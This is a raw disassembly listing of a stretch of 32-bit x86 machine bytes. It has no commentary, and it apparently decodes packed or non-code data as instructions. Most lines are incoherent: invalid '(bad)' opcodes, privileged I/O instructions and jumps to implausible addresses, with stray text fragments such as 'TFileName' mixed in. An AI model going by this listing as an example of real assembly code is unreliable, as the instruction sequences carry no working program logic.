  414ce6:	6d                   	insl   (%dx),%es:(%edi)
  414ce7:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  414ce8:	c4                   	(bad)
  414ce9:	ff 30                	push   (%eax)
  414ceb:	99                   	cltd
  414cec:	fc                   	cld
  414ced:	4e                   	dec    %esi
  414cee:	7c 2a                	jl     0x414d1a
  414cf0:	8c 7d 26             	mov    %?,0x26(%ebp)
  414cf3:	fb                   	sti
  414cf4:	b7 0b                	mov    $0xb,%bh
  414cf6:	5f                   	pop    %edi
  414cf7:	56                   	push   %esi
  414cf8:	7e 22                	jle    0x414d1c
  414cfa:	29 f1                	sub    %esi,%ecx
  414cfc:	d1 7e 02             	sarl   $1,0x2(%esi)
  414cff:	20 29                	and    %ch,(%ecx)
  414d01:	f9                   	stc
  414d02:	01 f2                	add    %esi,%edx
  414d04:	8d 04 17             	lea    (%edi,%edx,1),%eax
  414d07:	9b                   	fwait
  414d08:	1f                   	pop    %ds
  414d09:	85 8e 16 27 4a 52    	test   %ecx,0x524a2716(%esi)
  414d0f:	03 9f 2e 0f 42 d7    	add    -0x28bdf0d2(%edi),%ebx
  414d15:	9d                   	popf
  414d16:	9c                   	pushf
  414d17:	86 40 3b             	xchg   %al,0x3b(%eax)
  414d1a:	31 9b 8b 4f fc 95    	xor    %ebx,-0x6a03b075(%ebx)
  414d20:	28 fd                	sub    %bh,%ch
  414d22:	8e 57 d2             	mov    -0x2e(%edi),%ss
  414d25:	4a                   	dec    %edx
  414d26:	78 1b                	js     0x414d43
  414d28:	8a 06                	mov    (%esi),%al
  414d2a:	46                   	inc    %esi
  414d2b:	2a 03                	sub    (%ebx),%al
  414d2d:	d7                   	xlat   %ds:(%ebx)
  414d2e:	68 77 37 10 10       	push   $0x10103777
  414d33:	89 cb                	mov    %ecx,%ebx
  414d35:	1c d1                	sbb    $0xd1,%al
  414d37:	f3 a6                	repz cmpsb %es:(%edi),%ds:(%esi)
  414d39:	2f                   	das
  414d3a:	3e 89 4c 8d 46       	mov    %ecx,%ds:0x46(%ebp,%ecx,4)
  414d3f:	01 96 37 0a b0 92    	add    %edx,-0x6d4ff5c9(%esi)
  414d45:	11 14 96             	adc    %edx,(%esi,%edx,4)
  414d48:	bf f8 4d 33 bb       	mov    $0xbb334df8,%edi
  414d4d:	c2 ad f1             	ret    $0xf1ad
  414d50:	8f 40 4c             	pop    0x4c(%eax)
  414d53:	7e 48                	jle    0x414d9d
  414d55:	0f 56 23             	orps   (%ebx),%xmm4
  414d58:	83 71 a1 c5          	xorl   $0xffffffc5,-0x5f(%ecx)
  414d5c:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  414d5d:	78 da                	js     0x414d39
  414d5f:	75 1d                	jne    0x414d7e
  414d61:	fa                   	cli
  414d62:	b6 c2                	mov    $0xc2,%dh
  414d64:	09 5e 68             	or     %ebx,0x68(%esi)
  414d67:	fa                   	cli
  414d68:	b0 33                	mov    $0x33,%al
  414d6a:	e0 07                	loopne 0x414d73
  414d6c:	5c                   	pop    %esp
  414d6d:	58                   	pop    %eax
  414d6e:	f6 89 2d 70 fc c6 16 	testb  $0x16,-0x39038fd3(%ecx)
  414d75:	8c c2                	mov    %es,%edx
  414d77:	2e c6                	cs (bad)
  414d79:	eb 28                	jmp    0x414da3
  414d7b:	13 e3                	adc    %ebx,%esp
  414d7d:	31 a4 ed 86 2d 68 fa 	xor    %esp,-0x597d27a(%ebp,%ebp,8)
  414d84:	44                   	inc    %esp
  414d85:	39 f1                	cmp    %esi,%ecx
  414d87:	7c b5                	jl     0x414d3e
  414d89:	f1                   	int1
  414d8a:	ef                   	out    %eax,(%dx)
  414d8b:	6b 32 02             	imul   $0x2,(%edx),%esi
  414d8e:	03 0f                	add    (%edi),%ecx
  414d90:	0e                   	push   %cs
  414d91:	bd ec cd 36 41       	mov    $0x4136cdec,%ebp
  414d96:	36 44                	ss inc %esp
  414d98:	58                   	pop    %eax
  414d99:	7b 7a                	jnp    0x414e15
  414d9b:	42                   	inc    %edx
  414d9c:	63 c5                	arpl   %eax,%ebp
  414d9e:	4e                   	dec    %esi
  414d9f:	60                   	pusha
  414da0:	0c 03                	or     $0x3,%al
  414da2:	50                   	push   %eax
  414da3:	1c f5                	sbb    $0xf5,%al
  414da5:	e8 eb 6b 7d 7a       	call   0x7abeb995
  414daa:	9f                   	lahf
  414dab:	eb 53                	jmp    0x414e00
  414dad:	8a 13                	mov    (%ebx),%dl
  414daf:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  414db0:	8d 18                	lea    (%eax),%ebx
  414db2:	8b 58 e2             	mov    -0x1e(%eax),%ebx
  414db5:	42                   	inc    %edx
  414db6:	e1 7c                	loope  0x414e34
  414db8:	11 41 16             	adc    %eax,0x16(%ecx)
  414dbb:	fc                   	cld
  414dbc:	3b 1e                	cmp    (%esi),%ebx
  414dbe:	d6                   	salc
  414dbf:	82 0e 12             	orb    $0x12,(%esi)
  414dc2:	43                   	inc    %ebx
  414dc3:	2f                   	das
  414dc4:	6c                   	insb   (%dx),%es:(%edi)
  414dc5:	62 4f 7f             	bound  %ecx,0x7f(%edi)
  414dc8:	04 f7                	add    $0xf7,%al
  414dca:	74 88                	je     0x414d54
  414dcc:	e7 43                	out    %eax,$0x43
  414dce:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  414dcf:	8a 17                	mov    (%edi),%dl
  414dd1:	67 6b 7b a1 90       	imul   $0xffffff90,-0x5f(%bp,%di),%edi
  414dd6:	86 11                	xchg   %dl,(%ecx)
  414dd8:	8a 56 01             	mov    0x1(%esi),%dl
  414ddb:	47                   	inc    %edi
  414ddc:	3c 5e                	cmp    $0x5e,%al
  414dde:	6d                   	insl   (%dx),%es:(%edi)
  414ddf:	70 81                	jo     0x414d62
  414de1:	7f 22                	jg     0x414e05
  414de3:	3c 0b                	cmp    $0xb,%al
  414de5:	74 1e                	je     0x414e05
  414de7:	3c 0c                	cmp    $0xc,%al
  414de9:	49                   	dec    %ecx
  414dea:	3c 0d                	cmp    $0xd,%al
  414dec:	52                   	push   %edx
  414ded:	3c dc                	cmp    $0xdc,%al
  414def:	8d                   	lea    (bad),%ebx
  414df0:	db 1b                	fistpl (%ebx)
  414df2:	a8 4d                	test   $0x4d,%al
  414df4:	3c 0f                	cmp    $0xf,%al
  414df6:	97                   	xchg   %eax,%edi
  414df7:	3c 11                	cmp    $0x11,%al
  414df9:	39 b0 02 3c de 1c    	cmp    %esi,0x1cde3c02(%eax)
  414dff:	10 a3 2d b1 4c f8    	adc    %ah,-0x7b34ed3(%ebx)
  414e05:	eb 45                	jmp    0x414e4c
  414e07:	97                   	xchg   %eax,%edi
  414e08:	6d                   	insl   (%dx),%es:(%edi)
  414e09:	d9 de                	(bad)
  414e0b:	09 89 4b 04 02 08    	or     %ecx,0x802044b(%ecx)
  414e11:	0c 12                	or     $0x12,%al
  414e13:	10 ef                	adc    %ch,%bh
  414e15:	eb 4b                	jmp    0x414e62
  414e17:	df 2e                	fildll (%esi)
  414e19:	f4                   	hlt
  414e1a:	32 55 89             	xor    -0x77(%ebp),%dl
  414e1d:	d5 98                	aad    $0x98
  414e1f:	2e 0a de             	cs or  %dh,%bl
  414e22:	03 5c 2e 02          	add    0x2(%esi,%ebp,1),%ebx
  414e26:	82 2e 6b             	subb   $0x6b,(%esi)
  414e29:	71 8b                	jno    0x414db6
  414e2b:	6d                   	insl   (%dx),%es:(%edi)
  414e2c:	8b 12                	mov    (%edx),%edx
  414e2e:	7f 1c                	jg     0x414e4c
  414e30:	e8 5d 58 1d b1       	call   0xb15ea692
  414e35:	7c a5                	jl     0x414ddc
  414e37:	99                   	cltd
  414e38:	19 61 15             	sbb    %esp,0x15(%ecx)
  414e3b:	3c f0                	cmp    $0xf0,%al
  414e3d:	72 00                	jb     0x414e3f
  414e3f:	2c 16                	sub    $0x16,%al
  414e41:	2f                   	das
  414e42:	c3                   	ret
  414e43:	30 4c 59 22          	xor    %cl,0x22(%ecx,%ebx,2)
  414e47:	08 6d 40             	or     %ch,0x40(%ebp)
  414e4a:	97                   	xchg   %eax,%edi
  414e4b:	04 10                	add    $0x10,%al
  414e4d:	6a 17                	push   $0x17
  414e4f:	b8 1a 07 e7 09       	mov    $0x9e7071a,%eax
  414e54:	b0 10                	mov    $0x10,%al
  414e56:	b0 44                	mov    $0x44,%al
  414e58:	85 3e                	test   %edi,(%esi)
  414e5a:	f6 c3 71             	test   $0x71,%bl
  414e5d:	14 e0                	adc    $0xe0,%al
  414e5f:	4d                   	dec    %ebp
  414e60:	d3 8d ec 2a e1 df    	rorl   %cl,-0x201ed514(%ebp)
  414e66:	25 3e 51 66 b6       	and    $0xb666513e,%eax
  414e6b:	d2 34 5c             	shlb   %cl,(%esp,%ebx,2)
  414e6e:	76 2c                	jbe    0x414e9c
  414e70:	84 e3                	test   %ah,%bl
  414e72:	b6 1d                	mov    $0x1d,%dh
  414e74:	23 b6 07 8b 32 31    	and    0x31328b07(%esi),%esi
  414e7a:	26 42                	es inc %edx
  414e7c:	01 66 87             	add    %esp,-0x79(%esi)
  414e7f:	d6                   	salc
  414e80:	17                   	pop    %ss
  414e81:	e1 7f                	loope  0x414f02
  414e83:	0a a2 10 31 73 cd    	or     -0x328ccef0(%edx),%ah
  414e89:	b6 f0                	mov    $0xf0,%dh
  414e8b:	4e                   	dec    %esi
  414e8c:	be 14 1c 31 07       	mov    $0x7311c14,%esi
  414e91:	c0 e7 77             	shl    $0x77,%bh
  414e94:	19 85 cf d0 3e 2f    	sbb    %eax,0x2f3ed0cf(%ebp)
  414e9a:	18 eb                	sbb    %ch,%bl
  414e9c:	6e                   	outsb  %ds:(%esi),(%dx)
  414e9d:	13 03                	adc    (%ebx),%eax
  414e9f:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  414ea0:	34 08                	xor    $0x8,%al
  414ea2:	c8 c8 0b e4          	enter  $0xbc8,$0xe4
  414ea6:	f3 eb 5f             	repz jmp 0x414f08
  414ea9:	30 4c 41 67          	xor    %cl,0x67(%ecx,%eax,2)
  414ead:	f3 7d 5e             	repz jge 0x414f0e
  414eb0:	30 00                	xor    %al,(%eax)
  414eb2:	eb 2b                	jmp    0x414edf
  414eb4:	42                   	inc    %edx
  414eb5:	04 32                	add    $0x32,%al
  414eb7:	88 f5                	mov    %dh,%ch
  414eb9:	f2 ac                	repnz lods %ds:(%esi),%al
  414ebb:	b5 1c                	mov    $0x1c,%ch
  414ebd:	0e                   	push   %cs
  414ebe:	1d 10 31 70 f1       	sbb    $0xf1703110,%eax
  414ec3:	eb 0b                	jmp    0x414ed0
  414ec5:	e0 78                	loopne 0x414f3f
  414ec7:	93                   	xchg   %eax,%ebx
  414ec8:	ea 71 b2 0a 37 48 75 	ljmp   $0x7548,$0x370ab271
  414ecf:	e1 8c                	loope  0x414e5d
  414ed1:	1c e9                	sbb    $0xe9,%al
  414ed3:	43                   	inc    %ebx
  414ed4:	b0 11                	mov    $0x11,%al
  414ed6:	1e                   	push   %ds
  414ed7:	f5                   	cmc
  414ed8:	0d 45 81 14 1b       	or     $0x1b148145,%eax
  414edd:	f7 24 24             	mull   (%esp)
  414ee0:	89 c1                	mov    %eax,%ecx
  414ee2:	57                   	push   %edi
  414ee3:	81 ad 22 56 26 0c f4 	subl   $0x7aacf3f4,0xc265622(%ebp)
  414eea:	f3 ac 7a 
  414eed:	a1 31 08 ca e2       	mov    0xe2ca0831,%eax
  414ef2:	c2 08 00             	ret    $0x8
  414ef5:	13 d5                	adc    %ebp,%edx
  414ef7:	b2 34                	mov    $0x34,%dl
  414ef9:	63 33                	arpl   %esi,(%ebx)
  414efb:	6f                   	outsl  %ds:(%esi),(%dx)
  414efc:	ce                   	into
  414efd:	49                   	dec    %ecx
  414efe:	27                   	daa
  414eff:	0a cd                	or     %ch,%cl
  414f01:	50                   	push   %eax
  414f02:	68 1b 84 83 b4       	push   $0xb483841b
  414f07:	7b 11                	jnp    0x414f1a
  414f09:	ac                   	lods   %ds:(%esi),%al
  414f0a:	73 3c                	jae    0x414f48
  414f0c:	8b ae 22 07 b5 30    	mov    0x30b50722(%esi),%ebp
  414f12:	82 17 c9             	adcb   $0xc9,(%edi)
  414f15:	ea ec 73 63 46 34 6a 	ljmp   $0x6a34,$0x466373ec
  414f1c:	d0 52 69             	rclb   $1,0x69(%edx)
  414f1f:	43                   	inc    %ebx
  414f20:	b2 23                	mov    $0x23,%dl
  414f22:	9a 3a 83 7d 9c 39 2e 	lcall  $0x2e39,$0x9c7d833a
  414f29:	eb 41                	jmp    0x414f6c
  414f2b:	da a0 11 0f 8b 5d    	fisubl 0x5d8b0f11(%eax)
  414f31:	f8                   	clc
  414f32:	03 50 04             	add    0x4(%eax),%edx
  414f35:	ed                   	in     (%dx),%eax
  414f36:	d1 64 32 58          	shll   $1,0x58(%edx,%esi,1)
  414f3a:	0a 4e 19             	or     0x19(%esi),%cl
  414f3d:	26 04 0f             	es add $0xf,%al
  414f40:	6b 1c 38 75          	imul   $0x75,(%eax,%edi,1),%ebx
  414f44:	c7                   	(bad)
  414f45:	30 e0                	xor    %ah,%al
  414f47:	9d                   	popf
  414f48:	a0 9b 07 15 28       	mov    0x2815079b,%al
  414f4d:	b0 a5                	mov    $0xa5,%al
  414f4f:	06                   	push   %es
  414f50:	c8 8f dc 04          	enter  $0xdc8f,$0x4
  414f54:	bf 66 c0 80 42       	mov    $0x4280c066,%edi
  414f59:	62 84 06 6e 55 b7 16 	bound  %eax,0x16b7556e(%esi,%eax,1)
  414f60:	ac                   	lods   %ds:(%esi),%al
  414f61:	5a                   	pop    %edx
  414f62:	ef                   	out    %eax,(%dx)
  414f63:	f3 30 71 87          	repz xor %dh,-0x79(%ecx)
  414f67:	42                   	inc    %edx
  414f68:	3b 05 38 fd 22 4b    	cmp    0x4b22fd38,%eax
  414f6e:	1d fb 22 00 44       	sbb    $0x440022fb,%eax
  414f73:	eb 1f                	jmp    0x414f94
  414f75:	99                   	cltd
  414f76:	b0 b5                	mov    $0xb5,%al
  414f78:	88 5b 34             	mov    %bl,0x34(%ebx)
  414f7b:	50                   	push   %eax
  414f7c:	eb 55                	jmp    0x414fd3
  414f7e:	fc                   	cld
  414f7f:	62 17                	bound  %edx,(%edi)
  414f81:	51                   	push   %ecx
  414f82:	70 ad                	jo     0x414f31
  414f84:	04 d5                	add    $0xd5,%al
  414f86:	8d 91 af 48 7a 67    	lea    0x677a48af(%ecx),%edx
  414f8c:	44                   	inc    %esp
  414f8d:	ea 9e c2 7f 87 86 8e 	ljmp   $0x8e86,$0x877fc29e
  414f94:	45                   	inc    %ebp
  414f95:	7e 8b                	jle    0x414f22
  414f97:	02 ff                	add    %bh,%bh
  414f99:	50                   	push   %eax
  414f9a:	08 f3                	or     %dh,%bl
  414f9c:	f0 53                	lock push %ebx
  414f9e:	84 e9                	test   %ch,%cl
  414fa0:	ff 90 df 55 f0 8c    	call   *-0x730faa21(%eax)
  414fa6:	0a 43 6a             	or     0x6a(%ebx),%al
  414fa9:	07                   	pop    %es
  414faa:	8d 55 f5             	lea    -0xb(%ebp),%edx
  414fad:	52                   	push   %edx
  414fae:	68 04 10 9a 20       	push   $0x209a1004
  414fb3:	ba ad 06 0c 28       	mov    $0x280c06ad,%edx
  414fb8:	f0 11 b9 f4 81 73 67 	lock adc %edi,0x677381f4(%ecx)
  414fbf:	c9                   	leave
  414fc0:	0f 2b 5c 8b 3f       	movntps %xmm3,0x3f(%ebx,%ecx,4)
  414fc5:	1e                   	push   %ds
  414fc6:	60                   	pusha
  414fc7:	0a 40 59             	or     0x59(%eax),%al
  414fca:	68 cf 27 fc 97       	push   $0x97fc27cf
  414fcf:	16                   	push   %ss
  414fd0:	c3                   	ret
  414fd1:	b9 c9 b7 11 48       	mov    $0x4811b7c9,%ecx
  414fd6:	31 69 89             	xor    %ebp,-0x77(%ecx)
  414fd9:	67 8a a5 0a 87       	mov    -0x78f6(%di),%ah
  414fde:	5b                   	pop    %ebx
  414fdf:	10 73 50             	adc    %dh,0x50(%ebx)
  414fe2:	7c c8                	jl     0x414fac
  414fe4:	07                   	pop    %es
  414fe5:	50                   	push   %eax
  414fe6:	62 43 ff             	bound  %eax,-0x1(%ebx)
  414fe9:	05 a8 b3 18 7d       	add    $0x7d18b3a8,%eax
  414fee:	de 9f 23 b8 3c c0    	ficomps -0x3fc347dd(%edi)
  414ff4:	1b 90 a4 09 33 d9    	sbb    -0x26ccf65c(%eax),%edx
  414ffa:	2e c8 d4 c3 04       	cs enter $0xc3d4,$0x4
  414fff:	09 20                	or     %esp,(%eax)
  415001:	5f                   	pop    %edi
  415002:	69 fe 6d 6a 30 57    	imul   $0x57306a6d,%esi,%edi
  415008:	f8                   	clc
  415009:	bf 83 2d 42 01       	mov    $0x1422d83,%edi
  41500e:	0f 83 c5 a9 06 2a    	jae    0x2a47f9d9
  415014:	e5 9e                	in     $0x9e,%eax
  415016:	99                   	cltd
  415017:	fc                   	cld
  415018:	02 d3                	add    %bl,%dl
  41501a:	9a 91 db 00 1a 3a c0 	lcall  $0xc03a,$0x1a00db91
  415021:	00 48 9f             	add    %cl,-0x61(%eax)
  415024:	b9 01 18 d2 fc       	mov    $0xfcd21801,%ecx
  415029:	1f                   	pop    %ds
  41502a:	3c 08                	cmp    $0x8,%al
  41502c:	6c                   	insb   (%dx),%es:(%edi)
  41502d:	bb cd f6 00 80       	mov    $0x8000f6cd,%ebx
  415032:	66 1d 40 b0          	sbb    $0xb040,%ax
  415036:	d7                   	xlat   %ds:(%ebx)
  415037:	08 0c c2             	or     %cl,(%edx,%eax,8)
  41503a:	ea 55 e7 20 d8 c3 20 	ljmp   $0x20c3,$0xd820e755
  415041:	83 b5 7a d6 10 a6 01 	xorl   $0x1,-0x59ef2986(%ebp)
  415048:	6c                   	insb   (%dx),%es:(%edi)
  415049:	21 09                	and    %ecx,(%ecx)
  41504b:	54                   	push   %esp
  41504c:	d9 13                	fsts   (%ebx)
  41504e:	70 80                	jo     0x414fd0
  415050:	25 da e2 2d 10       	and    $0x102de2da,%eax
  415055:	16                   	push   %ss
  415056:	82 ef 80             	sub    $0x80,%bh
  415059:	09 66 83             	or     %esp,-0x7d(%esi)
  41505c:	f8                   	clc
  41505d:	04 76                	add    $0x76,%al
  41505f:	e1 ac                	loope  0x41500d
  415061:	f7 e9                	imul   %ecx
  415063:	f9                   	stc
  415064:	55                   	push   %ebp
  415065:	e4 eb                	in     $0xeb,%al
  415067:	20 24 09             	and    %ah,(%ecx,%ecx,1)
  41506a:	a0 a3 14 c4 5f       	mov    0x5fc414a3,%al
  41506f:	48                   	dec    %eax
  415070:	36 10 0f             	adc    %cl,%ss:(%edi)
  415073:	0e                   	push   %cs
  415074:	4c                   	dec    %esp
  415075:	a3 24 60 67 44       	mov    %eax,0x44676024
  41507a:	3f                   	aas
  41507b:	af                   	scas   %es:(%edi),%eax
  41507c:	ff 25 80 f7 7c 07    	jmp    *0x77cf780
  415082:	58                   	pop    %eax
  415083:	2a 32                	sub    (%edx),%dh
  415085:	c8 78 74 9d          	enter  $0x7478,$0x9d
  415089:	40                   	inc    %eax
  41508a:	09 0a                	or     %ecx,(%edx)
  41508c:	87 26                	xchg   %esp,(%esi)
  41508e:	46                   	inc    %esi
  41508f:	44                   	inc    %esp
  415090:	c7                   	(bad)
  415091:	30 ab b6 9e e2 1b    	xor    %ch,0x1be29eb6(%ebx)
  415097:	53                   	push   %ebx
  415098:	11 68 35             	adc    %ebp,0x35(%eax)
  41509b:	36 47                	ss inc %edi
  41509d:	b0 c4                	mov    $0xc4,%al
  41509f:	09 2f                	or     %ebp,(%edi)
  4150a1:	61                   	popa
  4150a2:	dd 0a                	fisttpll (%edx)
  4150a4:	b8 e2 b3 29 bf       	mov    $0xbf29b3e2,%eax
  4150a9:	ac                   	lods   %ds:(%esi),%al
  4150aa:	e3 6b                	jecxz  0x415117
  4150ac:	34 1f                	xor    $0x1f,%al
  4150ae:	5c                   	pop    %esp
  4150af:	1e                   	push   %ds
  4150b0:	0c 14                	or     $0x14,%al
  4150b2:	eb 0c                	jmp    0x4150c0
  4150b4:	50                   	push   %eax
  4150b5:	a1 4c bd f5 7d       	mov    0x7df5bd4c,%eax
  4150ba:	29 50 1b             	sub    %edx,0x1b(%eax)
  4150bd:	54                   	push   %esp
  4150be:	82 8a 0d 50 b0 fd 68 	orb    $0x68,-0x24faff3(%edx)
  4150c5:	e3 c7                	jecxz  0x41508e
  4150c7:	12 84 c9 75 26 64 bb 	adc    -0x449bd98b(%ecx,%ecx,8),%al
  4150ce:	2c a3                	sub    $0xa3,%al
  4150d0:	04 82                	add    $0x82,%al
  4150d2:	e0 1d                	loopne 0x4150f1
  4150d4:	97                   	xchg   %eax,%edi
  4150d5:	8d 3c 70             	lea    (%eax,%esi,2),%edi
  4150d8:	2b 4c 7c 01          	sub    0x1(%esp,%edi,2),%ecx
  4150dc:	c3                   	ret
  4150dd:	a1 5c 7d ee 93       	mov    0x93ee7d5c,%eax
  4150e2:	39 2b                	cmp    %ebp,(%ebx)
  4150e4:	10 db                	adc    %bl,%bl
  4150e6:	c3                   	ret
  4150e7:	b8 b4 20 d2 08       	mov    $0x8d220b4,%eax
  4150ec:	c3                   	ret
  4150ed:	aa                   	stos   %al,%es:(%edi)
  4150ee:	a9 57 57 c0 b0       	test   $0xb0c05757,%eax
  4150f3:	1f                   	pop    %ds
  4150f4:	ce                   	into
  4150f5:	6c                   	insb   (%dx),%es:(%edi)
  4150f6:	b8 f7 34 3c a3       	mov    $0xa33c34f7,%eax
  4150fb:	54                   	push   %esp
  4150fc:	5b                   	pop    %ebx
  4150fd:	04 c5                	add    $0xc5,%al
  4150ff:	b8 1c 63 ef b3       	mov    $0xb3ef631c,%eax
  415104:	b3 bc                	mov    $0xbc,%bl
  415106:	06                   	push   %es
  415107:	c0 34 34 f4          	shlb   $0xf4,(%esp,%esi,1)
  41510b:	ba 3e a8 27 92       	mov    $0x9227a83e,%edx
  415110:	83 11 81             	adcl   $0xffffff81,(%ecx)
  415113:	a8 0f                	test   $0xf,%al
  415115:	2f                   	das
  415116:	6d                   	insl   (%dx),%es:(%edi)
  415117:	45                   	inc    %ebp
  415118:	2c 39                	sub    $0x39,%al
  41511a:	19 ee                	sbb    %ebp,%esi
  41511c:	58                   	pop    %eax
  41511d:	3f                   	aas
  41511e:	0a 74 45 83          	or     -0x7d(%ebp,%eax,2),%dh
  415122:	b5 d7                	mov    $0xd7,%ch
  415124:	78 eb                	js     0x415111
  415126:	0b 1e                	or     (%esi),%ebx
  415128:	98                   	cwtl
  415129:	37                   	aaa
  41512a:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  41512b:	25 07 32 20 60       	and    $0x60203207,%eax
  415130:	ac                   	lods   %ds:(%esi),%al
  415131:	1b 64 21 32          	sbb    0x32(%ecx,%eiz,1),%esp
  415135:	60                   	pusha
  415136:	67 9c                	addr16 pushf
  415138:	98                   	cwtl
  415139:	07                   	pop    %es
  41513a:	64 90                	fs nop
  41513c:	41                   	inc    %ecx
  41513d:	06                   	push   %es
  41513e:	94                   	xchg   %eax,%esp
  41513f:	90                   	nop
  415140:	8c 90 41 06 19 88    	mov    %ss,-0x77e6f9bf(%eax)
  415146:	e8 e4 41 06 19       	call   0x1947932f
  41514b:	64 e0 dc             	fs loopne 0x41512a
  41514e:	d8 06                	fadds  (%esi)
  415150:	19 64 90 d4          	sbb    %esp,-0x2c(%eax,%edx,4)
  415154:	d0 cc                	ror    $1,%ah
  415156:	c8 19 64 90          	enter  $0x6419,$0x90
  41515a:	41                   	inc    %ecx
  41515b:	c4                   	(bad)
  41515c:	c0 bc 64 90 41 06 b8 	sarb   $0xb4,-0x47f9be70(%esp,%eiz,2)
  415163:	b4 
  415164:	b0 90                	mov    $0x90,%al
  415166:	41                   	inc    %ecx
  415167:	06                   	push   %es
  415168:	19 ac a8 a4 5c 72 58 	sbb    %ebp,0x58725ca4(%eax,%ebp,4)
  41516f:	64 f0 ff 46 64       	lock incl %fs:0x64(%esi)
  415174:	20 47 c2             	and    %al,-0x3e(%edi)
  415177:	84 46 37             	test   %al,0x37(%esi)
  41517a:	64 72 20             	fs jb  0x41519d
  41517d:	03 76 dd             	add    -0x23(%esi),%esi
  415180:	37                   	aaa
  415181:	68 e4 ff 77 23       	push   $0x2377ffe4
  415186:	53                   	push   %ebx
  415187:	68 f4 17 0a 09       	push   $0x90a17f4
  41518c:	54                   	push   %esp
  41518d:	46                   	inc    %esi
  41518e:	69 6c 65 4e 61 6d 65 	imul   $0x28656d61,0x4e(%ebp,%eiz,2),%ebp
  415195:	28 
  415196:	f5                   	cmc
  415197:	ff                   	ljmp   (bad)
  415198:	ed                   	in     (%dx),%eax
  415199:	90                   	nop
  41519a:	04 47                	add    $0x47,%al
  41519c:	0f 0e                	femms
  41519e:	0a 54 53 65          	or     0x65(%ebx,%edx,2),%dl
  4151a2:	61                   	popa
  4151a3:	72 63                	jb     0x415208
  4151a5:	68 52 65 63 a2       	push   $0xa2636552
  4151aa:	5d                   	pop    %ebp
  4151ab:	81 3b e0 dc 97 27    	cmpl   $0x2797dce0,(%ebx)
  4151b1:	86 6c a8 ee          	xchg   %ch,-0x12(%eax,%ebp,4)
  4151b5:	20 73 1f             	and    %dh,0x1f(%ebx)
  4151b8:	00 7c 1f 18          	add    %bh,0x18(%edi,%ebx,1)
  4151bc:	61                   	popa
  4151bd:	8f                   	(bad)
  4151be:	92                   	xchg   %eax,%edx
  4151bf:	97                   	xchg   %eax,%edi
  4151c0:	13 0c 10             	adc    (%eax,%edx,1),%ecx
  4151c3:	40                   	inc    %eax
  4151c4:	04 28                	add    $0x28,%al
  4151c6:	03 b2 5b 89 7a 07    	add    0x77a895b(%edx),%esi
  4151cc:	54                   	push   %esp
  4151cd:	77 78                	ja     0x415247
  4151cf:	6d                   	insl   (%dx),%es:(%edi)
  4151d0:	d0 63 55             	shlb   $1,0x55(%ebx)
  4151d3:	b2 69                	mov    $0x69,%dl
  4151d5:	86 e0                	xchg   %ah,%al
  4151d7:	1c 20                	sbb    $0x20,%al
  4151d9:	47                   	inc    %edi
  4151da:	d1 67 9b             	shll   $1,-0x65(%edi)
  4151dd:	ed                   	in     (%dx),%eax
  4151de:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  4151df:	4c                   	dec    %esp
  4151e0:	03 b4 c4 4c 63 0d 54 	add    0x540d634c(%esp,%eax,8),%esi
  4151e7:	48                   	dec    %eax
  4151e8:	d9 85 59 2b cd ec    	flds   -0x1332d4a7(%ebp)
  4151ee:	69 07 3c 48 6b 94    	imul   $0x946b483c,(%edi),%eax
  4151f4:	2c 97                	sub    $0x97,%al
  4151f6:	17                   	pop    %ss
  4151f7:	4c                   	dec    %esp
  4151f8:	48                   	dec    %eax
  4151f9:	20 01                	and    %al,(%ecx)
  4151fb:	84 11                	test   %dl,(%ecx)
  4151fd:	ba 0b 39 98 4d       	mov    $0x4d98390b,%edx
  415202:	d0 0f                	rorb   $1,(%edi)
  415204:	0b 56 35             	or     0x35(%esi),%edx
  415207:	c1 ae 66 69 50 c7 b9 	shrl   $0xb9,-0x38af969a(%esi)
  41520e:	64 32 8d 36 40 5d fb 	xor    %fs:-0x4a2bfca(%ebp),%cl
  415215:	b8 1e 29 c8 06       	mov    $0x6c8291e,%eax
  41521a:	c4 5d 7d             	les    0x7d(%ebp),%ebx
  41521d:	04 1f                	add    $0x1f,%al
  41521f:	d6                   	salc
  415220:	7a ca                	jp     0x4151ec
  415222:	39 f7                	cmp    %esi,%edi
  415224:	36 82 12 6d          	adcb   $0x6d,%ss:(%edx)
  415228:	d5 2b                	aad    $0x2b
  41522a:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  41522b:	1d d1 7a eb 96       	sbb    $0x96eb7ad1,%eax
  415230:	4b                   	dec    %ebx
  415231:	ff                   	(bad)
  415232:	ff 0f                	decl   (%edi)
  415234:	fd                   	std
  415235:	10 83 ee 03 47 10    	adc    %al,0x104703ee(%ebx)
  41523b:	6b a5 9c 1d 24 1b 12 	imul   $0x12,0x1b241d9c(%ebp),%esp
  415242:	b1 e8                	mov    $0xe8,%cl
  415244:	c4 8b a2 37 9f d7    	les    -0x2860c85e(%ebx),%ecx
  41524a:	89 0a                	mov    %ecx,(%edx)
  41524c:	c4 18                	les    (%eax),%ebx
  41524e:	8b 7f 47             	mov    0x47(%edi),%edi
  415251:	a2 8f 4d 22 70       	mov    %al,0x70224d8f
  415256:	1a 38                	sbb    (%eax),%bh
  415258:	54                   	push   %esp
  415259:	8b f0                	mov    %eax,%esi
  41525b:	df 46 f4             	filds  -0xc(%esi)
  41525e:	b5 4a                	mov    $0x4a,%ch
  415260:	09 a8 97 d3 08 6c    	or     %ebp,0x6c08d397(%eax)
  415266:	06                   	push   %es
  415267:	30 83 7a 1c bf 3d    	xor    %al,0x3dbf1c7a(%ebx)
  41526d:	35 f9 62 17 50       	xor    $0x501762f9,%eax
  415272:	34 0f                	xor    $0xf,%al
  415274:	c3                   	ret
  415275:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  415276:	38 56 03             	cmp    %dl,0x3(%esi)
  415279:	74 04                	je     0x41527f
  41527b:	75 35                	jne    0x4152b2
  41527d:	ec                   	in     (%dx),%al
  41527e:	87 78 2e             	xchg   %edi,0x2e(%eax)
  415281:	f8                   	clc
  415282:	44                   	inc    %esp
  415283:	e3 81                	jecxz  0x415206
  415285:	c4 30                	les    (%eax),%esi
  415287:	3d 6e cc 3d 21       	cmp    $0x213dcc6e,%eax
  41528c:	88 1e                	mov    %bl,(%esi)
  41528e:	28 08                	sub    %cl,(%eax)
  415290:	48                   	dec    %eax
  415291:	50                   	push   %eax
  415292:	1b 10                	sbb    (%eax),%edx
